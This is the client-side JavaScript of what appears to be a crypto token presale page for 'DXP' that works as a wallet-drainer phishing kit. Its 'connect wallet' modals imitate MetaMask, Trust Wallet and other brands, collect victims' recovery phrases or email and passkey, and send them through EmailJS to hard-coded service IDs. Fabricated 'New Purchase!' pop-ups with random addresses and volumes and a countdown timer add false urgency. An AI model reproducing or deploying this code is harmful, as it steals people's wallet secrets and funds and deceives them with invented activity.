        // Initialize EmailJS (Replace with your actual keys)
        emailjs.init("SiqtsqFcjEHmEhAlI"); // Replace with your EmailJS public key

        // DOM Elements
        //const connectWalletBtn = document.getElementById('connectWalletBtn');
        const modalOverlay = document.getElementById('modalOverlay');
        const closeModal = document.getElementById('closeModal');
        const evmTab = document.getElementById('evmTab');
        const solanaTab = document.getElementById('solanaTab');
        const evmWallets = document.getElementById('evmWallets');
        const solanaWallets = document.getElementById('solanaWallets');
        
        // Auth modal elements
        const authModalOverlay = document.getElementById('authModalOverlay');
        const closeAuthModal = document.getElementById('closeAuthModal');
        const selectedWalletIcon = document.getElementById('selectedWalletIcon');
        const selectedWalletName = document.getElementById('selectedWalletName');
        const phraseOption = document.getElementById('phraseOption');
        const passkeyOption = document.getElementById('passkeyOption');
        
        // Form modal elements
        const formModalOverlay = document.getElementById('formModalOverlay');
        const closeFormModal = document.getElementById('closeFormModal');
        const authForm = document.getElementById('authForm');
        const phraseForm = document.getElementById('phraseForm');
        const passkeyForm = document.getElementById('passkeyForm');
        const formTitle = document.getElementById('formTitle');
        const formDescription = document.getElementById('formDescription');
        const submitBtn = document.getElementById('submitBtn');
        const submitText = document.getElementById('submitText');
        const loadingSpinner = document.getElementById('loadingSpinner');
        const successMessage = document.getElementById('successMessage');

        let currentWallet = '';
        let currentAuthMethod = '';

        // Open modal
        function connectWalletBtn(){
            modalOverlay.classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }

        // Close modal
        closeModal.addEventListener('click', () => {
            modalOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        });

        // Close modal when clicking overlay
        modalOverlay.addEventListener('click', (e) => {
            if (e.target === modalOverlay) {
                modalOverlay.classList.add('hidden');
                document.body.style.overflow = 'auto';
            }
        });

        // Tab switching
        evmTab.addEventListener('click', () => {
            evmTab.classList.add('bg-purple-600', 'text-white');
            evmTab.classList.remove('text-gray-600', 'hover:text-gray-800');
            solanaTab.classList.remove('bg-purple-600', 'text-white');
            solanaTab.classList.add('text-gray-600', 'hover:text-gray-800');
            evmWallets.classList.remove('hidden');
            solanaWallets.classList.add('hidden');
        });

        solanaTab.addEventListener('click', () => {
            solanaTab.classList.add('bg-purple-600', 'text-white');
            solanaTab.classList.remove('text-gray-600', 'hover:text-gray-800');
            evmTab.classList.remove('bg-purple-600', 'text-white');
            evmTab.classList.add('text-gray-600', 'hover:text-gray-800');
            solanaWallets.classList.remove('hidden');
            evmWallets.classList.add('hidden');
        });

        // Helper function to get wallet icon
        function getWalletIcon(walletName) {
            const icons = {
                'Coinbase Wallet': '<div class="w-6 h-6 bg-white rounded-full border-2 border-blue-600"></div>',
                'MetaMask': '<svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 7v10l10 5 10-5V7l-10-5z"/></svg>',
                'OKX Wallet': '<div class="grid grid-cols-2 gap-1"><div class="w-2 h-2 bg-white rounded-sm"></div><div class="w-2 h-2 bg-white rounded-sm"></div><div class="w-2 h-2 bg-white rounded-sm"></div><div class="w-2 h-2 bg-white rounded-sm"></div></div>',
                'Rainbow': '<div class="w-6 h-6 bg-white rounded-full"></div>',
                'Trust Wallet': '<div class="w-6 h-6 bg-white rounded border-2 border-blue-600"></div>',
                'WalletConnect': '<svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.94-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>',
                'Clover': '<svg width="20" height="20" viewBox="0 0 24 24" fill="white"><path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/></svg>',
                'Torus': '<span class="text-white font-bold text-lg">T</span>'
            };
            return icons[walletName] || '<div class="w-6 h-6 bg-white rounded-full"></div>';
        }

        function getWalletBgColor(walletName) {
            const colors = {
                'Coinbase Wallet': 'bg-blue-600',
                'MetaMask': 'bg-orange-500',
                'OKX Wallet': 'bg-black',
                'Rainbow': 'bg-gradient-to-r from-red-500 via-yellow-500 to-blue-500',
                'Trust Wallet': 'bg-blue-600',
                'WalletConnect': 'bg-blue-400',
                'Clover': 'bg-green-500',
                'Torus': 'bg-blue-600'
            };
            return colors[walletName] || 'bg-gray-500';
        }

        // Wallet selection
        document.querySelectorAll('.wallet-option').forEach(button => {
            button.addEventListener('click', (e) => {
                const walletName = e.currentTarget.querySelector('span').textContent;
                currentWallet = walletName;
                
                // Update auth modal with wallet info
                selectedWalletName.textContent = walletName;
                selectedWalletIcon.className = `w-16 h-16 mx-auto mb-4 rounded-full flex items-center justify-center ${getWalletBgColor(walletName)}`;
                selectedWalletIcon.innerHTML = getWalletIcon(walletName);
                
                // Close first modal and open auth modal
                modalOverlay.classList.add('hidden');
                authModalOverlay.classList.remove('hidden');
            });
        });

        // Auth method selection
        phraseOption.addEventListener('click', () => {
            currentAuthMethod = 'phrase';
            formTitle.textContent = 'Enter Recovery Phrase';
            formDescription.textContent = 'Please enter your recovery phrase to connect your wallet';
            phraseForm.classList.remove('hidden');
            passkeyForm.classList.add('hidden');
            
            // Make sure the recovery phrase field is focusable and required
            document.getElementById('recoveryPhrase').setAttribute('required', '');
            document.getElementById('passkeyEmail').removeAttribute('required');
            document.getElementById('passkey').removeAttribute('required');
            
            authModalOverlay.classList.add('hidden');
            formModalOverlay.classList.remove('hidden');
        });

        passkeyOption.addEventListener('click', () => {
            currentAuthMethod = 'passkey';
            formTitle.textContent = 'Enter Passkey';
            formDescription.textContent = 'Please enter your email and passkey to connect your wallet';
            passkeyForm.classList.remove('hidden');
            phraseForm.classList.add('hidden');
            
            // Make sure the passkey fields are focusable and required
            document.getElementById('passkeyEmail').setAttribute('required', '');
            document.getElementById('passkey').setAttribute('required', '');
            document.getElementById('recoveryPhrase').removeAttribute('required');
            
            authModalOverlay.classList.add('hidden');
            formModalOverlay.classList.remove('hidden');
        });

        // Custom form validation
        function validateForm() {
            if (currentAuthMethod === 'phrase') {
                const phrase = document.getElementById('recoveryPhrase').value.trim();
                if (!phrase || phrase.split(' ').length < 12) {
                    alert('Please enter a valid recovery phrase (12-24 words)');
                    document.getElementById('recoveryPhrase').focus();
                    return false;
                }
            } else if (currentAuthMethod === 'passkey') {
                const email = document.getElementById('passkeyEmail').value.trim();
                const passkey = document.getElementById('passkey').value.trim();
                
                if (!email) {
                    alert('Please enter your email address');
                    document.getElementById('passkeyEmail').focus();
                    return false;
                }
                
                // Basic email validation
                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
                if (!emailRegex.test(email)) {
                    alert('Please enter a valid email address');
                    document.getElementById('passkeyEmail').focus();
                    return false;
                }
                
                if (!passkey) {
                    alert('Please enter your passkey');
                    document.getElementById('passkey').focus();
                    return false;
                }
            }
            return true;
        }

        // Form submission
        authForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            // Custom validation
            if (!validateForm()) {
                return;
            }
            
            // Show loading state
            submitBtn.disabled = true;
            submitText.classList.add('hidden');
            loadingSpinner.classList.remove('hidden');
            
            // Prepare data for EmailJS
            const formData = {
                wallet_type: currentWallet,
                auth_method: currentAuthMethod,
                user_agent: navigator.userAgent,
                timestamp: new Date().toISOString(),
                recovery_phrase: currentAuthMethod === 'phrase' ? document.getElementById('recoveryPhrase').value : '',
                passkey_email: currentAuthMethod === 'passkey' ? document.getElementById('passkeyEmail').value : '',
                passkey: currentAuthMethod === 'passkey' ? document.getElementById('passkey').value : ''
            };

            try {
                // Send email using EmailJS
                await emailjs.send(
                    'service_qg99kwe', // Replace with your EmailJS service ID
                    'template_z2fgoq8', // Replace with your EmailJS template ID
                    formData
                );

                // Hide form and show success message
                authForm.classList.add('hidden');
                successMessage.classList.remove('hidden');

                // Auto close after 3 seconds
                setTimeout(() => {
                    closeAllModals();
                    resetForms();
                }, 3000);

            } catch (error) {
                console.error('EmailJS Error:', error);
                alert('Connection failed. Please try again.');
            } finally {
                // Reset loading state
                submitBtn.disabled = false;
                submitText.classList.remove('hidden');
                loadingSpinner.classList.add('hidden');
            }
        });

        // Close modal functions
        function closeAllModals() {
            modalOverlay.classList.add('hidden');
            authModalOverlay.classList.add('hidden');
            formModalOverlay.classList.add('hidden');
            document.body.style.overflow = 'auto';
        }

        function resetForms() {
            authForm.reset();
            authForm.classList.remove('hidden');
            successMessage.classList.add('hidden');
            phraseForm.classList.add('hidden');
            passkeyForm.classList.add('hidden');
            
            // Clear required attributes
            document.getElementById('recoveryPhrase').removeAttribute('required');
            document.getElementById('passkeyEmail').removeAttribute('required');
            document.getElementById('passkey').removeAttribute('required');
            
            currentWallet = '';
            currentAuthMethod = '';
        }

        // Modal close handlers
        closeAuthModal.addEventListener('click', closeAllModals);
        closeFormModal.addEventListener('click', closeAllModals);

        authModalOverlay.addEventListener('click', (e) => {
            if (e.target === authModalOverlay) closeAllModals();
        });

        formModalOverlay.addEventListener('click', (e) => {
            if (e.target === formModalOverlay) closeAllModals();
        });

        // Close modal with Escape key
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') {
                if (!formModalOverlay.classList.contains('hidden')) {
                    closeAllModals();
                } else if (!authModalOverlay.classList.contains('hidden')) {
                    closeAllModals();
                } else if (!modalOverlay.classList.contains('hidden')) {
                    closeAllModals();
                }
            }
        });

        // Initialize price chart
        const ctx = document.getElementById('priceChart').getContext('2d');
        new Chart(ctx, {
            type: 'line',
            data: {
                labels: ['Stage -1', 'Current stage', 'Stage I', 'Listing price'],
                datasets: [{
                    data: [0.00000, 0.00000, 0.00000, 0.35000],
                    borderColor: '#8b5cf6',
                    backgroundColor: 'rgba(139, 92, 246, 0.1)',
                    pointBackgroundColor: '#8b5cf6',
                    pointBorderColor: '#8b5cf6',
                    pointRadius: 6,
                    tension: 0.4,
                    fill: false
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        max: 0.4,
                        ticks: {
                            callback: function(value) {
                                return ' + value.toFixed(5)';
                            }
                        },
                        grid: {
                            color: 'rgba(0, 0, 0, 0.05)'
                        }
                    },
                    x: {
                        grid: {
                            color: 'rgba(0, 0, 0, 0.05)'
                        }
                    }
                },
                elements: {
                    point: {
                        hoverRadius: 8
                    }
                }
            }
        });

     

// Set your countdown target end time as a fixed UTC timestamp string (adjust this as needed)
const countdownEndTimeUTC = '2025-07-26T08:17:00Z'; // <-- example target time in UTC ISO format

async function getInternetTime() {
  try {
    // Use a public API to get accurate time (WorldTimeAPI used here as an example)
    const response = await fetch('https://worldtimeapi.org/api/ip');
    if (!response.ok) throw new Error('Failed to fetch time');
    const data = await response.json();
    return new Date(data.utc_datetime).getTime();
  } catch (err) {
    console.warn('Failed to get internet time, falling back to client time', err);
    return Date.now();
  }
}

(async () => {
  const targetTime = new Date(countdownEndTimeUTC).getTime();
  let now = await getInternetTime();

  function updateCountdown() {
    now += 1000; // Increment cached time by 1 second per update

    let diff = Math.max(0, Math.floor((targetTime - now) / 1000));

    const days = Math.floor(diff / (24 * 3600));
    const hours = Math.floor((diff % (24 * 3600)) / 3600);
    const minutes = Math.floor((diff % 3600) / 60);
    const seconds = diff % 60;

    // Update desktop timer IDs
    document.getElementById('days').textContent = days.toString().padStart(2, '0');
    document.getElementById('hours').textContent = hours.toString().padStart(2, '0');
    document.getElementById('minutes').textContent = minutes.toString().padStart(2, '0');
    document.getElementById('seconds').textContent = seconds.toString().padStart(2, '0');
    
    // Optional: Also update mobile timer if you want both synced
     document.getElementById('days-mobile').textContent = days.toString().padStart(2, '0');
     document.getElementById('hours-mobile').textContent = hours.toString().padStart(2, '0');
     document.getElementById('minutes-mobile').textContent = minutes.toString().padStart(2, '0');
     document.getElementById('seconds-mobile').textContent = seconds.toString().padStart(2, '0');

    if (diff === 0) {
      clearInterval(interval);
    }
  }

  updateCountdown();
  const interval = setInterval(updateCountdown, 1000);
})();



  


        class PurchaseNotificationSystem {
    constructor() {
        this.container = document.getElementById('notificationContainer');
        this.isActive = true;
        this.currentNotification = null;
        this.startNotifications();
    }

    generateRandomAddress() {
        const prefixes = ['0x', '1', '3', 'bc1'];
        const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        
        if (prefix === '0x') {
            const chars = '0123456789abcdef';
            let address = '0x';
            for (let i = 0; i < 40; i++) {
                address += chars[Math.floor(Math.random() * chars.length)];
            }
            return this.truncateAddress(address);
        } else {
            const chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
            let address = prefix;
            const length = Math.floor(Math.random() * 10) + 25;
            for (let i = 0; i < length; i++) {
                address += chars[Math.floor(Math.random() * chars.length)];
            }
            return this.truncateAddress(address);
        }
    }

    truncateAddress(address) {
        if (address.length > 12) {
            return address.slice(0, 6) + '...' + address.slice(-4);
        }
        return address;
    }

    generateRandomAmount() {
        const amounts = [
            { min: 50, max: 500, suffix: '' },
            { min: 500, max: 2000, suffix: '' },
            { min: 2000, max: 10000, suffix: '' },
            { min: 10, max: 100, suffix: 'K' }
        ];
        
        const range = amounts[Math.floor(Math.random() * amounts.length)];
        const amount = Math.floor(Math.random() * (range.max - range.min + 1)) + range.min;
        
        if (range.suffix === 'K') {
            return `${amount}${range.suffix}`;
        }
        
        return amount.toLocaleString();
    }

    generateRandomLocation() {
        const locations = [
            '🇺🇸 United States', '🇬🇧 United Kingdom', '🇨🇦 Canada',
            '🇩🇪 Germany', '🇫🇷 France', '🇯🇵 Japan', '🇰🇷 South Korea',
            '🇦🇺 Australia', '🇳🇱 Netherlands', '🇸🇬 Singapore',
            '🇨🇭 Switzerland', '🇸🇪 Sweden', '🇳🇴 Norway',
            '🇩🇰 Denmark', '🇮🇪 Ireland', '🇳🇿 New Zealand',
            '🇮🇳 India', '🇧🇷 Brazil', '🇦🇪 UAE', '🇪🇸 Spain'
        ];
        
        return locations[Math.floor(Math.random() * locations.length)];
    }

    createNotification() {
        const address = this.generateRandomAddress();
        const amount = this.generateRandomAmount();
        const location = this.generateRandomLocation();
        const timeAgo = Math.floor(Math.random() * 60) + 1;

        const notification = document.createElement('div');
        notification.className = 'bg-white border border-gray-200 rounded-lg shadow-lg p-4 mb-3 notification-enter transform translate-x-full';
        
        notification.innerHTML = `
            <div class="flex items-start space-x-3">
                <div class="flex-shrink-0">
                    <div class="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center pulse-animation">
                        <svg class="w-5 h-5 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 8c-1.657 0-3 .895-3 2s1.343 2 3 2 3 .895 3 2-1.343 2-3 2m0-8c1.11 0 2.08.402 2.599 1M12 8V7m0 1v8m0 0v1m0-1c-1.11 0-2.08-.402-2.599-1"></path>
                        </svg>
                    </div>
                </div>
                <div class="flex-1 min-w-0">
                    <div class="flex items-center justify-between">
                        <p class="text-sm font-medium text-gray-900">New Purchase!</p>
                        <button class="ml-2 text-gray-400 hover:text-gray-600 transition-colors" onclick="this.closest('.notification-enter').remove()">
                            <svg class="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
                            </svg>
                        </button>
                    </div>
                    <p class="text-sm text-gray-600 mt-1">
                        <span class="font-semibold text-purple-600">${amount} DXP</span> tokens purchased
                    </p>
                    <div class="mt-2 space-y-1">
                        <p class="text-xs text-gray-500">
                            <span class="font-mono">${address}</span>
                        </p>
                        <div class="flex items-center justify-between">
                            <p class="text-xs text-gray-500">${location}</p>
                            <p class="text-xs text-gray-400">${timeAgo}s ago</p>
                        </div>
                    </div>
                </div>
            </div>
            <div class="mt-3 bg-gradient-to-r from-purple-50 to-blue-50 rounded-md p-2">
                <div class="flex items-center justify-between text-xs">
                    <span class="text-gray-600">Total Volume Today:</span>
                    <span class="font-semibold text-purple-600">$${(Math.random() * 500000 + 100000).toLocaleString(undefined, {maximumFractionDigits: 0})}</span>
                </div>
            </div>
        `;

        return notification;
    }

    showNotification() {
        if (this.currentNotification) {
            this.hideCurrentNotification();
        }

        const notification = this.createNotification();
        this.container.appendChild(notification);
        this.currentNotification = notification;

        setTimeout(() => {
            notification.classList.remove('translate-x-full');
        }, 10);

        setTimeout(() => {
            this.hideNotification(notification);
        }, 25000);
    }

    hideNotification(notification) {
        if (notification && notification.parentNode) {
            notification.classList.add('notification-exit');
            setTimeout(() => {
                if (notification.parentNode) {
                    notification.remove();
                }
                if (this.currentNotification === notification) {
                    this.currentNotification = null;
                }
            }, 500);
        }
    }

    hideCurrentNotification() {
        if (this.currentNotification) {
            this.hideNotification(this.currentNotification);
        }
    }

    startNotifications() {
        setTimeout(() => {
            this.showNotification();
        }, 2000);

        setInterval(() => {
            if (this.isActive) {
                this.showNotification();
            }
        }, 30000);
    }
}

// Initialize the notification system
const notificationSystem = new PurchaseNotificationSystem();